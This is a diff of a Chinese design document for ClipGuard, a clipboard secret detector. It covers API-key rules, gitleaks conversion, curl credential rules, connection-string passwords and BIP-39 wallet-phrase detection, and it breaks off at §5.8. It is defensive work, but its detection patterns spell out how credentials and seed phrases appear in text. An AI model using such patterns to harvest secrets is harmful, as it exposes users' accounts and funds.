+程式：`crates/core/src/secret/`（`engine.rs`、`normalize.rs`、`checksum.rs`、`pii.rs`、`mask.rs`、`packs.rs`，1b 加上 `mnemonic.rs`）、`crates/rules/src/secret.rs`（舊版 `crates/core/src/secret/engine.rs`、`crates/core/src/secret/engine.rs`、`crates/core/src/secret/normalize.rs`、`crates/core/src/secret/checksum.rs`、`crates/core/src/secret/pii.rs`、`crates/core/src/secret/mask.rs`、`crates/core/src/secret/packs.rs`）；規則檔 `rules/*.json`（§5.4）。個資分成通用包和國家包（#27，§5.6）。Phase 1b 新增錢包助記詞（§5.7）和含密碼的資料庫連線字串（§5.8）。
 
 API key 分三層（#26）：
 
 | 層 | 規則 | 位置 |
 |---|---|---|
-| 1. 已知格式 | 手寫的前綴規則（GitHub、sk-、AWS、Stripe、JWT、PEM…），加上從 gitleaks 轉換的 198 條服務格式 | `rules/api-keys.json`、`rules/gitleaks.json` |
+| 1. 已知格式 | 手寫的前綴規則（GitHub、sk-、AWS、Stripe、JWT、PEM…），加上從 gitleaks 轉換的 198 條服務格式；1b 加上資料庫連線字串（§5.8）和 gitleaks 的 2 條 curl 規則（排在第 2 層後面） | `rules/api-keys.json`、`rules/gitleaks.json`、`rules/connection-strings.json`、`rules/gitleaks-late.json` |
 | 2. 上下文＋亂度 | 值前面有像金鑰的名稱（`api_key=`、`"token": `、`Authorization: Bearer`），而且值夠長、夠亂 | `rules/context.json`，§5.5 |
 | 3. 自行登記 | 前兩層都抓不到的，使用者自己登記（HMAC） | §5.1 |
 
@@ -300,20 +392,24 @@ API key 分三層（#26）：
 | API key（第 1 層，gitleaks） | 198 條服務專屬格式（Shopify、DigitalOcean、Twilio、Postman…），部分要求前面有服務名稱（`adafruit … = <值>`） | 依各規則：固定前綴、長度、gitleaks 的亂度門檻與 allowlist |
 | JWT | `eyJ…` 開頭、三段 base64url（header ≤ 512、payload ≤ 6144、signature ≤ 1024 字，signature 可以是空的）。結尾可以接句點；五段的 JWE 不算 | header 要能解成 JSON 物件，而且有字串型別的 `alg` |
 | 疑似金鑰或密碼、Authorization 權杖（第 2 層） | 見 §5.5 | 長度、亂度、排除佔位字 |
+| 錢包助記詞（1b） | 連續 12、15、18、21、24 個 BIP-39 英文單字，見 §5.7 | BIP-39 checksum（SHA-256） |
+| 資料庫連線密碼（1b） | `postgres://帳號:密碼@主機`、`Server=…;User Id=…;Password=…`，見 §5.8 | 排除佔位字和常見的預設密碼 |
+| curl 的帳密與標頭（1b，gitleaks） | `curl -u 帳號:密碼`、`curl -H "Authorization: …"`／`-H "X-Token: …"`，可以跨 5 行 | gitleaks 的亂度門檻與 allowlist |
 
 - JWT 歸在 API key 類（`SecretKind.ApiKey`，標籤「JWT」），遮罩成 `eyJ********xyz`（P4）。
+- **佔位字（1b）**：手寫前綴規則（`api-keys.json`）的值如果是「英文前綴＋全部是 x」（`sk_test_xxxxxxxxxxxxxxxx`、`sk-XXXX…`，至少 6 個 x、大小寫一致）就不算，這是文件和 `.env.example` 的寫法（良性語料 `benign.text.083`）。只排除整段都是 x 的；值裡面有一段 x、其他是亂數的照樣算，所以不會變成繞過的方法。
 - API key 類規則檔的命中都是 `SecretKind.ApiKey`，通知格式跟以前一樣是「標籤 遮罩」：有固定前綴的保留前綴（`shpat_********3f1`、`ghp_********xyz`），沒有前綴的只留最後 3 碼（`********x7Q`）。PEM 只顯示標頭，貼遮罩版時一路遮到 END 行。
-- 重疊時的優先順序就是規則的順序：`api-keys.json`（10）→ `gitleaks.json`（20）→ `context.json`（30）→ 國家包（40，依檔名）→ 通用包（50）。同一把 key 被手寫規則和 gitleaks 同時抓到時，標籤用手寫的；`+886 9…` 同時是台灣手機和國際電話時，用台灣手機。#27 之前個資內部的順序是身分證 → 卡號 → 統編 → 手機，現在是身分證 → 統編 → 手機 → 卡號，這幾種實際上不會重疊（數字邊界和分組都不同），所以結果不變。
+- 重疊時的優先順序就是規則的順序：`api-keys.json`（10）→ `mnemonic.json`（15，1b）→ `gitleaks.json`（20）→ `connection-strings.json`（25，1b）→ `context.json`（30）→ `gitleaks-late.json`（35，1b）→ 國家包（40，依檔名）→ 通用包（50）。同一把 key 被手寫規則和 gitleaks 同時抓到時，標籤用手寫的；`+886 9…` 同時是台灣手機和國際電話時，用台灣手機。#27 之前個資內部的順序是身分證 → 卡號 → 統編 → 手機，現在是身分證 → 統編 → 手機 → 卡號，這幾種實際上不會重疊（數字邊界和分組都不同），所以結果不變。
 - 統編要求關鍵字的原因：改成「能被 5 整除」之後，隨機的 8 位數字約有 1/5 會通過檢查碼，日期和訂單號碼都會誤報（P6）。所以**沒有關鍵字的統編刻意不偵測**（#22 F13），README 的已知限制也有寫。
 - 掃描上限（`SecretDetector.MaxScanLength`）不能超過剪貼簿的讀取上限（§2.2）。
 
-### 5.1 登記的機密（`RegisteredSecretStore.cs`、`DpapiKeyProtector.cs`）
+### 5.1 登記的機密（`crates/core/src/policy/registered.rs`、`DpapiKeyProtector`（舊版；Phase 4 改用 OS keyring））
 - 長度限制 6–256 字元，標籤最多 40 字。
 - 只存 `(id, label, length, HMAC-SHA256, createdAt)`，路徑是 `%LOCALAPPDATA%\ClipGuard\secrets.json`。
 - HMAC 金鑰是 32 bytes 的亂數，用 DPAPI（CurrentUser）保護，存在 `key.bin`。金鑰解不開時直接報錯，**不會**自動重建。
 - 比對方式：依每一種登記過的長度，對內容做滑動視窗算 HMAC，再用 `FixedTimeEquals` 比對。最多掃前 20,000 字。
 - **禁止**改用單純的 SHA-256。身分證、手機這類資料只有約 1e8–1e9 種組合，可以被暴力反推。
-- **登記對話框**（`SecretRegistration.cs` 檢查、`SecretGuard.cs` 的 `RegisterSecretForm`）：機密空白、長度不在 6–256、確認欄空白、兩次不一樣、重複登記或寫檔失敗時，對話框不關，錯誤顯示在欄位旁（ErrorProvider）和按鈕上方的紅字，焦點留在出錯的欄位（不一樣時清空確認欄）。標籤可以留空（存成「未命名」）。錯誤訊息只說原因，不含輸入的內容。
+- **登記對話框**（`crates/core/src/policy/registered.rs` 檢查、`SecretGuard`（舊版 Windows App；Phase 4 由 `crates/platform` 與桌面 App 重做） 的 `RegisterSecretForm`）：機密空白、長度不在 6–256、確認欄空白、兩次不一樣、重複登記或寫檔失敗時，對話框不關，錯誤顯示在欄位旁（ErrorProvider）和按鈕上方的紅字，焦點留在出錯的欄位（不一樣時清空確認欄）。標籤可以留空（存成「未命名」）。錯誤訊息只說原因，不含輸入的內容。
 - **無障礙**：三個輸入框都有 AccessibleName／AccessibleDescription；標籤帶 Alt 快速鍵（`&L`、`&S`、`&C`），TabIndex 緊接在輸入框前面；出錯時把錯誤寫進該欄的 AccessibleDescription 並發出 UIA 通知。跟確認框一樣，沒按 Alt 的單一字母不會觸發快速鍵。
 - 以前寫入失敗（太短、重複）會先關掉對話框、跳一個沒有 owner 的訊息框再重開；訊息框可能落在別的視窗後面，看起來像對話框自己消失（#24 黑箱測試時遇過兩次）。現在所有錯誤都在對話框裡顯示，成功的訊息框以對話框為 owner。
 
@@ -322,12 +418,15 @@ API key 分三層（#26）：
 |---|---|
 | 超過 1 Mi 字時，中間那段不分析（只分析頭尾）；長於 8K 字的 JWT、JWE（五段）不偵測 | #22 的取捨 |
 | 沒有關鍵字的統編刻意不偵測（P6，見上） | #22 F13，刻意的 |
-| 兩個以上連續分隔符號（`A12345  6789`）、分隔符號超過上限、不在上述分組裡的卡號或手機寫法（例如 `09-1234-5678`、`41 11 11…`） | #22 的取捨 |
+| 兩個以上連續分隔符號（`A12345  6789`）、分隔符號超過上限、不在上述分組裡的卡號或手機寫法（例如 `09-1234-5678`、`41 11 11…`） | #22 的取捨；1b 檢討後保留：放寬分隔符號會把表格、日期清單裡不相干的數字湊成號碼（P6），而 `09-1234-5678` 不是台灣手機的慣用寫法 |
 | 號碼前面緊貼著零寬字元和英數字時（`X​A123456789`），零寬字元刪掉後會黏在一起，不算命中 | #22 的取捨 |
 | 登記的機密仍只掃前 20,000 字，也沒有正規化（比對的是 HMAC，全形版本是另一個字串） | 尚未開 issue |
-| 沒有固定前綴、前面也沒有金鑰名稱的 key（例如一行裡只有一串亂碼）不偵測；名稱是中文（`金鑰：…`、`密碼=…`）也不算（§5.5） | #26 的取捨 |
-| 第 2 層的值不能有空白、引號、`$`、`&`、括號，所以含這些字元的密碼抓不到；短於 16 字、亂度不夠（例如 `password=hunter2`、由英文單字組成的密碼）、32 字以下又沒有數字的也不算 | #26 的取捨 |
-| `curl -u 帳號:密碼`、只看檔名的規則（`.p12`、Terraform、NuGet 設定）、Kubernetes Secret YAML 沒有收（§5.4 的略過清單） | #26 的取捨 |
+| 沒有固定前綴、前面也沒有金鑰名稱的 key（例如一行裡只有一串亂碼）不偵測 | #26 的取捨 |
+| 中日韓的金鑰名稱（1b，§5.5 `context-assignment-cjk`）只認清單裡的詞（密碼、金鑰、密鑰、私鑰、權杖、令牌、口令、パスワード、비밀번호…），而且名稱的最後一個字要緊接在 `=`／`:` 前面（中間只能有引號和空白）；`密碼（API）：…` 這種名稱和冒號之間夾著括號的不算 | 1b 的取捨：清單外的詞（例如「憑證」也指 certificate）誤報太高 |
+| 第 2 層的值不能有空白、引號、`$`、`&`、括號，所以含這些字元的密碼抓不到；短於 16 字、亂度不夠（例如 `password=hunter2`、由英文單字組成的密碼）、32 字以下又沒有數字的也不算。1b 起資料庫連線字串裡的短密碼（`postgres://app:hunter2@…`）由 §5.8 抓 | #26 的取捨 |
+| 只看檔名的規則（`.p12`、Terraform、NuGet 設定）、Kubernetes Secret YAML 沒有收（§5.4 的略過清單）。`curl -u 帳號:密碼` 在 1b 補上（gitleaks `curl-auth-user`） | #26 的取捨 |
+| 助記詞（§5.7）：只認英文 BIP-39 單字表（日文、中文等其他語言的表、Electrum 的 seed 不算）；只認完整的一串，前後緊接著清單裡的字就整串不算（`my seed phrase abandon … about` 的 seed、phrase 都在清單裡，變成 14 個字），要用冒號、句點或清單外的字隔開；只寫前 4 個字母的縮寫、用 `-`、`|` 或表格框線分隔的不算 | 1b 的取捨：只認整串、不在長串裡挑視窗，誤報才壓得低（P6） |
+| 資料庫連線字串（§5.8）：ODBC 形式的 `Password=` 前面要有另一個連線參數（`Server=`、`User Id=`…）；一般網址的帳密（`https://user:pass@`）、`mysql -pSecret` 這類命令列參數、密碼含空白或引號（沒加引號時）、URL 編碼的 `@` 以外的特殊寫法不偵測；`postgres:postgres`、`guest`、`root`、`admin` 這類預設密碼刻意不算 | 1b 的取捨：預設帳密出現在教學文件和 docker-compose 範例裡，每次都警告會讓人關掉功能 |
 | 長於 8K 字的機密（`Overlap`）可能被分段切斷，跟 JWT 一樣 | #22、#26 的取捨 |
 | 個資只有 §5.6 的國家；IBAN 要大寫；國際電話沒有 `+` 就不算，後面緊接著另一組數字（`+1 202 555 0123 4`）時整段被當成太長而漏掉；IBAN 後面空一格接 4 個大寫英數字時也一樣 | #27 的取捨 |
 | 沒有檢查碼的國家格式（SSN、住民登錄番號）和 12 位數的個人番號，前面沒有關鍵字就不偵測；關鍵字不限同一行，可能把上一行的「SSN」算進來 | #27 的取捨（P6） |
@@ -337,7 +436,7 @@ API key 分三層（#26）：
 
 ### 5.3 貼上攔截（嚴格模式）
 
-程式：`src/ClipGuard.Core/PasteGuard.cs`（決策、遮罩）、`PasteGuardSettingsStore.cs`；`src/ClipGuard.App/PasteInterceptor.cs`、`KeyboardPasteHook.cs`、`PasteConfirmForm.cs`。
+程式：`crates/core/src/policy/paste.rs`（決策、遮罩）、`crates/core/src/policy/paste.rs`；`PasteInterceptor`（舊版 Windows App；Phase 4 由 `crates/platform` 與桌面 App 重做）、`KeyboardPasteHook`（舊版 Windows App；Phase 4 由 `crates/platform` 與桌面 App 重做）、`PasteConfirmForm`（舊版 Windows App；Phase 4 由 `crates/platform` 與桌面 App 重做）。
 
 只在複製時通知不夠：Windows 會把通知排隊，使用者手快 Ctrl+V 再按 Enter，機密就送出了。所以剪貼簿含機密時，要在**貼上當下**擋住。
 
@@ -389,23 +488,25 @@ rules/*.json ──(內嵌資源)───────────────�
 gitleaks.toml ─ node tools/convert-gitleaks.mjs ─> rules/gitleaks.json（commit 進 repo）
 ```
 
+Rust 版（phase 1）：`crates/rules` 用 `include_str!` 內嵌 `rules/*.json` 和 `rules/secret/bip39-english.txt`；擴充功能改用 WASM，不再需要第二份規則。gitleaks 的轉換改成 `cargo xtask rules gitleaks <toml> <版本> <commit>`（`xtask/src/rules.rs`，舊版 `convert-gitleaks.mjs` 的移植，同一份 toml 產生的 `gitleaks.json` 除了說明文字和下面的 curl 規則之外完全相同）。
+
 - **桌面版**：`ClipGuard.Core.csproj` 把 `rules/*.json` 內嵌進組件，執行時不讀檔、不連網（P3）。
-- **插件**：執行時讀不到 `extension/` 外面的檔案，所以用 `tools/build-extension-rules.mjs` 把規則複製成 `extension/lib/rules.generated.js`（commit 進 repo）。`extension/test/rules.test.js` 會重新產生一次跟檔案比對，忘了執行就會失敗。
+- **插件**：執行時讀不到 `extension/` 外面的檔案，所以用 `tools/build-extension-rules.mjs`（舊版；新版插件直接用 WASM 引擎，不再需要） 把規則複製成 `extension/lib/rules.generated.js`（commit 進 repo）。`extension/test/rules.test.js` 會重新產生一次跟檔案比對，忘了執行就會失敗。
 - **gitleaks**：toml 先另外下載（`gh api`），再用 `tools/convert-gitleaks.mjs <toml> <版本> <commit>` 轉換；執行時從不連網。授權見 `THIRD_PARTY_NOTICES.md`。目前是 v8.30.1（commit `5f6ec56`）。
 
 **檔案格式**（`format: 1`）：
 
 | 欄位 | 說明 |
 |---|---|
-| `name`、`priority` | 檔案依 `priority` 由小到大排（同值依檔名），前面的規則在重疊時優先。目前 api-keys 10、gitleaks 20、context 30、國家包 40、通用個資包 50 |
+| `name`、`priority` | 檔案依 `priority` 由小到大排（同值依檔名），前面的規則在重疊時優先。目前 api-keys 10、mnemonic 15、gitleaks 20、connection-strings 25、context 30、gitleaks-late 35、國家包 40、通用個資包 50 |
 | `pack`（#27） | 檔案層級：`universal`（沒寫就是這個，一律開啟）或兩個大寫字母的國家代碼（`TW`、`US`…），見 §5.6 |
 | `exclude`、`stopwords`（檔案層級） | 套用到檔案裡每一條規則（gitleaks 的全域 allowlist 就放這裡） |
-| `skipped` | 只有 gitleaks.json 有：沒收的規則和原因（產生的，不要手改） |
+| `skipped` | 只有 gitleaks 產生的檔案有：沒收的規則和原因（產生的，不要手改；gitleaks-late.json 的是空的） |
 | `rules[].id` | 所有檔案裡不能重複。gitleaks 的加 `gitleaks.` 前綴 |
-| `kind` | `api-key`、`national-id`、`resident-certificate`、`business-id`、`credit-card`、`mobile-phone`、`phone-number`、`bank-account`，對應 `SecretKind` 的同名值；插件結果的 `type` 就是這個字串（#27 以前是 `tw-id`、`ubn`、`tw-mobile`）。新增時 C# 的 `ReadRule` 和 JS 的 `KINDS` 兩邊一起加 |
+| `kind` | `api-key`、`national-id`、`resident-certificate`、`business-id`、`credit-card`、`mobile-phone`、`phone-number`、`bank-account`、`mnemonic`（1b），對應 `SecretKind` 的同名值；插件結果的 `type` 就是這個字串（#27 以前是 `tw-id`、`ubn`、`tw-mobile`）。新增時 C# 的 `ReadRule` 和 JS 的 `KINDS` 兩邊一起加 |
 | `label` | 通知裡顯示的名稱 |
 | `regex`、`ignoreCase` | 語法限制見下方 |
-| `finder`（#27） | 取代 `regex`：regex 寫不出來的格式用程式寫的候選產生器，兩邊各實作一次（`PiiFormats.Finder`、`pii.js` 的 `FINDERS`）。目前只有 `card-groups`（信用卡分組，§5.0：要在幾組數字裡挑第一個 Luhn 對的）。`regex` 和 `finder` 一定要有其中一個 |
+| `finder`（#27） | 取代 `regex`：regex 寫不出來的格式用程式寫的候選產生器，兩邊各實作一次（`PiiFormats.Finder`、`pii.js` 的 `FINDERS`）。目前有 `card-groups`（信用卡分組，§5.0：要在幾組數字裡挑第一個 Luhn 對的）和 `bip39`（1b，助記詞，§5.7）。`regex` 和 `finder` 一定要有其中一個 |
 | `secretGroup` | 機密是第幾個群組；沒寫就是第一個有比對到、不是空字串的群組，沒有群組就是整段（同 gitleaks）。結果的位置、遮罩、貼遮罩版都只針對這一段 |
 | `keywords` | 小寫。文字轉小寫後至少出現一個才跑 regex（同 gitleaks 的預先篩選，是效能的關鍵）。沒寫表示一律跑 |
 | `notPrecededBy`、`notFollowedBy` | 取代 lookaround：前一個字元符合 `notPrecededBy`（單一字元的類別）或比對結果後面接著 `notFollowedBy` 時不算 |
@@ -417,18 +518,18 @@ gitleaks.toml ─ node tools/convert-gitleaks.mjs ─> rules/gitleaks.json（com
 | `stopwords` | 機密（轉小寫）包含其中一個就不算（同 gitleaks） |
 | `validate` | 額外的驗證，兩邊各實作一次（`PiiFormats.Validator`、`rules.js`／`pii.js` 的 `VALIDATORS`）：`jwt-header`、`tw-id`（含分隔符號最多 3 個）、`tw-ubn`、`iban`、`e164`、`cn-id`、`jp-my-number`、`hk-id`、`sg-nric`、`us-ssn`（含分隔符號一致）。驗證收到的是含分隔符號的字串，自己去掉 |
 | `context`（#27） | `{keywords, before, after}`：機密前面 `before` 字內（關鍵字的結尾）或後面 `after` 字內（關鍵字的開頭）要出現其中一個關鍵字。比對的是**正規化後的文字**，不是 ASCII 版本，所以 `統編`、`マイナンバー`、`주민등록번호` 可以直接寫；英文字母不分大小寫（只轉 A–Z，長度不變），開頭或結尾是英文字母的關鍵字不能緊貼著其他英文字母（`vat` 不比 private、`ssn` 不比 Assn）。關鍵字要小寫、1–24 字，`before`、`after` 0–32 而且不能都是 0（要落在每段往前多看的 64 字內）。整段文字裡沒有任何關鍵字時直接跳過這條規則 |
-| `mask` | `{keepStart, keepEnd, canonical}`：遮罩時保留的開頭、結尾長度（`keepEnd` 預設 3），`canonical` 是遮罩前先換成的標準寫法：`alnum-upper`（只留英數字、轉大寫）、`digits`、`tw-mobile`（`+886 9…` 換成 `09…`）、`e164`（`+` 加數字）。或 `"pem-block"`：只顯示標頭，貼遮罩版遮到 END 行。#27 起插件和桌面版的遮罩字串一樣（`SecretMasker.Mask` ＝ `pii.js` 的 `maskValue`：星號最多 8 個、至少遮 4 個字） |
+| `mask` | `{keepStart, keepEnd, canonical}`：遮罩時保留的開頭、結尾長度（`keepEnd` 預設 3），`canonical` 是遮罩前先換成的標準寫法：`alnum-upper`（只留英數字、轉大寫）、`digits`、`tw-mobile`（`+886 9…` 換成 `09…`）、`e164`（`+` 加數字）。或 `"pem-block"`：只顯示標頭，貼遮罩版遮到 END 行；或 `"word-count"`（1b，助記詞）：什麼字都不留，遮罩是 `******** (12)`，字數也放進標籤的參數 `words`。#27 起插件和桌面版的遮罩字串一樣（`SecretMasker.Mask` ＝ `pii.js` 的 `maskValue`：星號最多 8 個、至少遮 4 個字） |
 
 **regex 語法**：只用 .NET 和 JS（沒有 `u` 旗標）行為一樣的子集合，而且不能用 lookaround、backreference、possessive、atomic group 和行內旗標 `(?i)`（要整條不分大小寫就用 `ignoreCase`）。理由：
 
-- **線性時間**：.NET 用 `RegexOptions.NonBacktracking` 編譯（不支援 lookaround），最壞情況也是線性。JS 是回溯引擎，所以 gitleaks 規則裡在 JS 會變成 O(n²) 的（curl 那兩條）不收；兩邊的測試都會拿每條規則跑 1 Mi 字的病態輸入。
+- **線性時間**：.NET 用 `RegexOptions.NonBacktracking` 編譯（不支援 lookaround），最壞情況也是線性。JS 是回溯引擎，所以 gitleaks 規則裡在 JS 會變成 O(n²) 的（curl 那兩條）舊版不收；Rust 的 `regex` 保證線性，1b 收回來了。測試會拿每條規則跑 1 Mi 字的病態輸入。
 - **`$`** 是「整段結尾」（JS 沒有 `m` 旗標時的意思）；.NET 的 `$` 在最後一個換行前也成立，所以載入時換成 `\z`。
 - **ASCII 版本**：`\b`、`\w`、不分大小寫在 .NET 認 Unicode，在 JS 只認 ASCII。所以規則比對的是「非 ASCII 字元都換成 U+001A」的版本（長度不變，位置直接對回原文），兩邊結果一樣，而且中文緊貼著 key（`金鑰dop_v1_…`）也找得到。
 - **NonBacktracking 的群組**：.NET 9 的 NonBacktracking 找到的範圍正確，但有些 pattern 的捕獲群組是空的（實測 context-assignment），所以範圍交給 NonBacktracking，群組在那一小段裡用一般引擎（`^(?:…)\z`，逾時 200 ms）重比一次。
 
-**gitleaks 怎麼轉**（`tools/convert-gitleaks.mjs`）：`\w`、`\d`、`\s`、`.` 展開成 RE2 的 ASCII 定義（`\s` 不含 `\v`，`.` 不含 `\n`）；只在開頭的 `(?i)` 改成 `ignoreCase`，其他位置的 `(?i)`、`(?-i:…)` 展開成 `[Aa]`；`(?P<name>…)` 改成一般群組（編號不變）；POSIX 類別展開；開頭只用來包住變數名稱的 `[\w.-]{0,50}?` 拿掉（不影響找到的機密，但 JS 每個位置都要試 50 次）。allowlist 裡「本身就是一把完整 key」的範例字串不收：它們會被 GitHub push protection 擋，也會被當成外洩。
+**gitleaks 怎麼轉**（`cargo run -p xtask -- rules gitleaks`（`xtask/src/rules.rs`））：`\w`、`\d`、`\s`、`.` 展開成 RE2 的 ASCII 定義（`\s` 不含 `\v`，`.` 不含 `\n`）；只在開頭的 `(?i)` 改成 `ignoreCase`，其他位置的 `(?i)`、`(?-i:…)` 展開成 `[Aa]`；`(?P<name>…)` 改成一般群組（編號不變）；POSIX 類別展開；開頭只用來包住變數名稱的 `[\w.-]{0,50}?` 拿掉（不影響找到的機密，但 JS 每個位置都要試 50 次）。allowlist 裡「本身就是一把完整 key」的範例字串不收：它們會被 GitHub push protection 擋，也會被當成外洩。
 
-**沒收的 gitleaks 規則**（24 條，完整原因在 `rules/gitleaks.json` 的 `skipped`）：
+**沒收的 gitleaks 規則**（22 條，完整原因在 `rules/gitleaks.json` 的 `skipped`）：
 
 | 原因 | 規則 |
 |---|---|
@@ -436,17 +537,19 @@ gitleaks.toml ─ node tools/convert-gitleaks.mjs ─> rules/gitleaks.json（com
 | 手寫規則已涵蓋 | github-pat、github-oauth、github-app-token、github-refresh-token、github-fine-grained-pat、jwt、private-key |
 | client ID 是公開的識別碼 | adobe、asana、bitbucket、discord、linkedin、looker、messagebird、plaid 的 client-id |
 | 只在特定檔案類型才成立（剪貼簿沒有檔名） | freemius-secret-key、hashicorp-tf-password、kubernetes-secret-yaml、nuget-config-password、pkcs12-file |
-| JS 會變成 O(n²) | curl-auth-header、curl-auth-user |
 | 會把 git SHA 當成 token | sourcegraph-access-token（有一個分支是單獨的 40 位 hex） |
+
+**curl 的兩條規則（1b）**：舊版因為 JS 會變成 O(n²) 而沒收的 `curl-auth-header`、`curl-auth-user`，Rust 版收回來，但放在另一個產生的檔案 `rules/gitleaks-late.json`（priority 35，排在第 2 層 context.json 後面）：它們把 `curl -H` 後面的任何值都當成權杖，比第 2 層泛，重疊時讓校準過亂度的 context-authorization／context-assignment 保留原本的標籤（舊語料 `secret.rules.context-bearer` 等），curl 規則只補第 2 層抓不到的：`curl -u 帳號:密碼`、短於 16 字的 Basic 值、沒寫 Bearer 的 `Authorization:`、`X-Token:` 這類自訂標頭。哪些規則放進 late 檔由 `xtask/src/rules.rs` 的 `LATE` 決定。1 Mi 字的病態輸入（滿滿的 `curl -u aaa:`、`curl\n`）最慢一條 38 ms（release）。
 
 ### 5.5 上下文＋亂度（第 2 層，`rules/context.json`）
 
-兩條規則：
+三條規則（第三條是 1b 加的）：
 
 | 規則 | 上下文 | 值 |
 |---|---|---|
 | context-assignment（疑似金鑰或密碼） | 名稱含 `api_key`／`apikey`／`api-key`、`secret`、`token`、`password`／`passwd`、`pwd`、`credential`、`private_key`、`access_key`、`auth_key`、`signing_key`、`encryption_key`、`master_key`、`session_key`（不分大小寫，`.`、`_`、`-` 都可以），後面接 `=`、`:`、`:=`、`=>`、`?=`、`+=`，名稱和值可以有引號。涵蓋 `.env` 的 `KEY=value`、`export`、JSON 的 `"apiKey": "…"`、YAML、程式碼的指定、`X-API-Key:` 標頭、`$env:X = "…"` | 16–512 字的 `[A-Za-z0-9_+/=.~!@#%^*-]`，後面要接空白、引號、`;`、`,`、`)`、`}`、`]`、`>`、`&` 或結尾 |
 | context-authorization（Authorization 權杖） | `Authorization:`（或 `=`）加 `Bearer`、`Token`、`Basic`、`ApiKey`，包括 `curl -H "Authorization: Bearer …"` | 16–1024 字的 `[A-Za-z0-9_+/=.~-]` |
+| context-assignment-cjk（疑似金鑰或密碼，1b） | 中日韓的金鑰名稱緊接著 `=`、`:`、`:=`、`=>`（全形 `：`、`＝` 正規化後也算），名稱和值可以有引號。名稱用 `context` 關鍵字比對（值前面 16 字內）：密碼、密码、金鑰、密鑰、密钥、秘鑰、秘钥、私鑰、私钥、權杖、令牌、口令、パスワード、秘密鍵、暗号鍵、アクセスキー、トークン、비밀번호、암호、토큰 | 同 context-assignment；結尾還可以接中文標點（`。`） |
 
 值要再通過：
 
@@ -473,7 +576,9 @@ gitleaks.toml ─ node tools/convert-gitleaks.mjs ─> rules/gitleaks.json（com
 
 `token = GetToken()`、`password = input()` 這類程式碼不會命中：值後面接的是 `(`，不是結尾字元。
 
-**誤報樣本**：`tests/fixtures/secret-false-positives.json`，C# 和插件的測試都跑同一份，涵蓋 md5／sha1／sha256、UUID、git log 與短 SHA、Base64 圖片（`data:` URL）、C#／JS／Python 程式碼、`package-lock.json` 和 `yarn.lock` 的 integrity、minified JS、`.env` 佔位字、連號、不是機密的 token 欄位、中文句子。
+context-assignment-cjk 的 regex 比的是 ASCII 版本（§5.4），中文字都是 U+001A，所以 regex 只要求「分隔符號前面是一個非 ASCII 字」，名稱本身交給 `context` 檢查；整段文字沒有任何一個關鍵字時直接跳過這條規則。值的條件（亂度、數字、連號、佔位字）跟 context-assignment 一樣，所以 `密碼：hunter2`、`密碼：請洽管理員` 不算。
+
+**誤報樣本**：`corpus/cases/secret-false-positives.jsonl`，C# 和插件的測試都跑同一份，涵蓋 md5／sha1／sha256、UUID、git log 與短 SHA、Base64 圖片（`data:` URL）、C#／JS／Python 程式碼、`package-lock.json` 和 `yarn.lock` 的 integrity、minified JS、`.env` 佔位字、連號、不是機密的 token 欄位、中文句子。
 
 **效能**（`SecretRulesTests`、`rules.test.js` 會量）：每條規則各跑 5 種 1 Mi 字的病態輸入（關鍵字重複、關鍵字加 `=`、關鍵字加 40 個字母、關鍵字後面接 1 Mi 個字母…），C# 最慢的一條 66 ms、JS 49 ms。整個 `SecretDetector.Find` 在 1 Mi 字、所有規則的關鍵字都出現時約 80 ms，滿滿的 `.env`（2 萬多筆命中）約 145 ms（C#；JS 約 115、155 ms）。不會因為長度整段跳過。
 
@@ -507,34 +612,99 @@ gitleaks.toml ─ node tools/convert-gitleaks.mjs ─> rules/gitleaks.json（com
 - **誤報樣本**：`SecretPacksTests`／`packs.test.js` 在所有包都開時跑日期、時間戳記、訂單與追蹤號碼、沒有關鍵字的 12 位數、美國格式的市話、UUID、大寫 hex、Base64、版本號（含 semver 的 `+`）、IP、時區 `UTC+0800`、檢查碼不對的型號、ISBN，以及共用的 `secret-false-positives.json`，都不能有任何命中。
 - **效能**：每條個資規則各跑 14 種 1 Mi 字的病態輸入（滿滿的數字、`1 `、`+1 `、`A1`、`DE89 `、括號、關鍵字加號碼、只有關鍵字…）：C# 最慢一條 135 ms、JS 47 ms；所有包都開時整個 `Find` 最慢 145 ms（C#，每 14 字一個統編）、126 ms（JS，每 25 字一個個人番號）。
 
+### 5.7 錢包助記詞（1b，`rules/mnemonic.json`、`crates/core/src/secret/mnemonic.rs`）
+
+助記詞（seed phrase）就是錢包本身：貼出去等於把錢交出去。所以只要格式和 checksum 都對就警告，不需要關鍵字。
+
+| 項目 | 規則 |
+|---|---|
+| 單字表 | BIP-39 官方英文表 2048 個字（`rules/secret/bip39-english.txt`，bitcoin/bips，MIT，來源見 THIRD_PARTY_NOTICES.md）。載入時檢查剛好 2048 個、3–8 個小寫字母、依字母排序（所以二分搜尋的位置就是 11 bit 的值） |
+| 一串 | 連續的清單單字，字和字之間只能是：空白、換行、tab（最多 16 字）、一個逗號，以及一個清單編號（`2.`、`2)`、`2:`、`(2)`、`2 `，1–2 位數）。其他東西（句點、冒號、`-`、清單外的英文字、中文字）都會把一串切斷。字不分大小寫；緊貼著數字或 `_` 的字（`abandon1`、`x_ability`）是識別字，不算 |
+| 長度 | 整串剛好 12、15、18、21、24 個字。**不在比較長的一串裡挑視窗**：13 個字就整串不算 |
+| checksum | 把每個字的 11 bit 接起來，前 `字數 × 32 / 3` bit 是 entropy，最後 `字數 / 3` bit 要等於 SHA-256(entropy) 的開頭。隨機的 12 個清單單字通過的機率是 1/16，24 個是 1/256 |
+| 種類、標籤 | `SecretKind::Mnemonic`（`mnemonic`）；標籤「錢包助記詞（12 個字）」／「Wallet recovery phrase (12 words)」，字數是 Fluent 參數 `words` |
+| 遮罩 | `******** (12)`：一個字都不留，只留字數。範圍從第一個字到最後一個字（中間的編號一起遮掉） |
+
+- **誤報**：一般英文很少連續 12 個字都在清單裡（the、and、of、your、with 都不在），就算有，checksum 也只有 1/16 會過。語料 `secret-1b-mnemonic.jsonl` 有 12 個字都在清單裡但 checksum 不對的句子、11／13／25 個字、checksum 錯的 12／24 個字、用 `-` 或句點連接的寫法。良性語料全部 0 筆。
+- **分段**：一串最長 24 個字 × (8 + 16) 字，遠小於每段往後多看的 8K 字；分隔最多 16 字，所以從上一段延續過來的一串，在這一段看到的第一個字一定落在往前多看的 64 字裡，不會被當成新的一串重複回報。
+- **效能**：1 Mi 字的 `abandon `、`1. abandon\n` 等病態輸入，整個 `find` 約 25 ms（release）：只切一次字、查二分表，一串超過 24 個字就不再記錄。
+
+### 5.8 含密碼的資料庫連線字串（1b，`rules/connection-strings.json`）
+
+| 規則 | 寫法 | 機密 |
+|---|---|---|
